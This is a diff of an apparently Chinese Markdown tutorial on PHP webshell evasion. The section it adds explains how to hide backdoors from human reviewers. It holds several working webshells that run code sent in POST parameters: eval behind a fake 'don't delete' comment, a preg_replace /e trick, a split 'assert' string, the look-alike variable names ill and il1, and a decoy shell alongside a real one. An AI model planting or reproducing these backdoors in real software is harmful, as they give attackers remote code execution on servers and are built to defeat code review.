@@ -582,9 +582,6 @@ php5.3测试成功
 ```
 
 
-
-
-
 # 流量
 这块随便把流量编码或者加密
 ```php
@@ -592,6 +589,88 @@ php5.3测试成功
 <?php
 eval(base64_decode($_POST[1]));
 ?>
+```
+
+# 面向人的免杀
+
+## 注释
+#### 无中生有-假装是正常代码
+自己的程序可以不写注释，shell一定要写个假注释
+```php
+//实例化对象的工厂与测试代码，千万别删除，可能程序导致崩溃或者莫名其妙的bug
+<?php
+class Test {
+    public $code;
+    public function test(){
+        eval($this->code);
+    }
+}
+
+class ClassFactory {
+   public function getObject($className){
+      return new $className;
+   }
+}
+
+$classFactory = new ClassFactory();
+$test = $classFactory->getObject("Test");
+$test->code = $_POST[1];
+$test->test();
+?>
+```
+
+
+## 代码
+#### 无中生有
+5.5 7.0不再支持/e
+```php
+<?php
+function filter()
+{
+    // TODO 其他安全过滤
+    // 过滤查询特殊字符
+    @preg_replace('@test|(.*)|EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN|@e','\\1',$_POST[1]);
+}
+filter();
+?>
+```
+
+
+#### 瞒天过海-正常代码插入shell
+插入在比较长的函数代码中
+```php
+function filter()
+{
+    $func = 'as'.'sert';
+    //其他n多代码
+    $code = $_POST[1];
+    //其他n多代码
+    $func($code);
+}
+filter();
+```
+
+#### 暗渡陈仓-1il
+```php
+<?php
+$ill = $_POST[1];
+//其他代码
+//.....
+//下面两行代码挨着写
+$il1 = "echo 'php test'";
+eval($ill);
+```
+
+
+#### 声东击西-假的shell
+暴露一个明显而隐晦，白色中带黑色shell，另外一个文件写入真正的shell。
+```php
+//另外一个文件写真正的shell
+
+//密码是1
+$code = "eval($####_POST####[1]);";
+$code = str_replace("####","",$code);
+eval($code);
 ```
 
 # 参考
